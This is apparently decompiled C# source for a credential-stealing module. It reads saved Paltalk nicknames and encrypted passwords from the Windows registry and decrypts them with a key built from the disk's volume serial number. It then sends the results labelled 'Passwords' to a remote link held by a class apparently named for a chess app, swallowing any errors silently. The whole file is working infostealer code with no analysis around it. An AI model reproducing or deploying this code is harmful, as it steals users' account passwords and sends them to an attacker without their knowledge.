using System;
using System.Management;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

// Token: 0x0200000B RID: 11
internal class Paltalk
{
	// Token: 0x0600003C RID: 60 RVA: 0x00002F30 File Offset: 0x00001F30
	public static void Recover()
	{
		checked
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Paltalk", false);
				if (registryKey != null)
				{
					string[] subKeyNames = registryKey.GetSubKeyNames();
					string str = Strings.Left(Conversions.ToString(registryKey.GetValue("InstallerAppDir")), 2);
					ManagementObject managementObject = new ManagementObject("Win32_LogicalDisk.DeviceID=\"" + str + "\"");
					PropertyData propertyData = managementObject.Properties["VolumeSerialNumber"];
					int num = 0;
					int num2 = 0;
					string text = propertyData.Value.ToString();
					foreach (string text2 in subKeyNames)
					{
						num2++;
					}
					string[] array2 = new string[num2 - 1 + 1];
					string text3 = ":___:";
					foreach (string str2 in subKeyNames)
					{
						RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Paltalk\\" + str2, false);
						array2[num] = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(registryKey2.GetValue("nickname"), text3), registryKey2.GetValue("pwd")));
						num++;
					}
					string text4 = null;
					string text5 = null;
					int num3 = 0;
					int num4 = num2 - 1;
					for (int k = num3; k <= num4; k++)
					{
						text5 = Strings.Split(array2[k], text3, -1, CompareMethod.Binary)[0];
						string text6 = Strings.Split(array2[k], text3, -1, CompareMethod.Binary)[1];
						string text7 = null;
						int num5 = 0;
						int num6 = text5.Length + text.Length - 1;
						for (int l = num5; l <= num6; l++)
						{
							if (l < text5.Length)
							{
								text7 += Conversions.ToString(text5[l]);
							}
							if (l < text.Length)
							{
								text7 += Conversions.ToString(text[l]);
							}
						}
						string text8 = text7;
						while ((double)text6.Length / 2.0 > (double)text8.Length)
						{
							text8 += text7;
						}
						string[] array4 = new string[text6.Length + 1];
						int num7 = 0;
						int num8 = (int)Math.Round(unchecked((double)text6.Length / 4.0 - 1.0));
						for (int m = num7; m <= num8; m++)
						{
							array4[m] = Paltalk.get3(text6, m * 4);
						}
						int num9 = 0;
						int num10 = (int)Math.Round(unchecked((double)text6.Length / 4.0 - 1.0));
						for (int n = num9; n <= num10; n++)
						{
							int b = Conversions.ToInteger(Paltalk.get3(text6, n * 4));
							if (n < 1)
							{
								string value = Conversions.ToString(Paltalk.Get_Int(text8, b));
								text4 += Conversions.ToString(Strings.ChrW(Conversions.ToInteger(value)));
							}
							else
							{
								text4 += Conversions.ToString(Strings.ChrW((int)Math.Round(unchecked(Conversions.ToDouble(array4[n]) - (double)text8[checked(n - 1)] - (double)n - 122.0))));
							}
						}
					}
					string host = " ";
					string username = text5;
					string password = text4;
					Send.SendLog(ChessTacticsPro.P_Link, "Passwords", null, null, "Paltalk", host, username, password, null);
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x0600003D RID: 61 RVA: 0x00003298 File Offset: 0x00002298
	public static int Get_Int(string A, int B)
	{
		return checked(B - (int)A[A.Length - 1] - 122);
	}

	// Token: 0x0600003E RID: 62 RVA: 0x000032BC File Offset: 0x000022BC
	private static string get3(string str, int startIndx)
	{
		string text = null;
		checked
		{
			int num = startIndx + 2;
			for (int i = startIndx; i <= num; i++)
			{
				text += Conversions.ToString(str[i]);
			}
			return text;
		}
	}
}
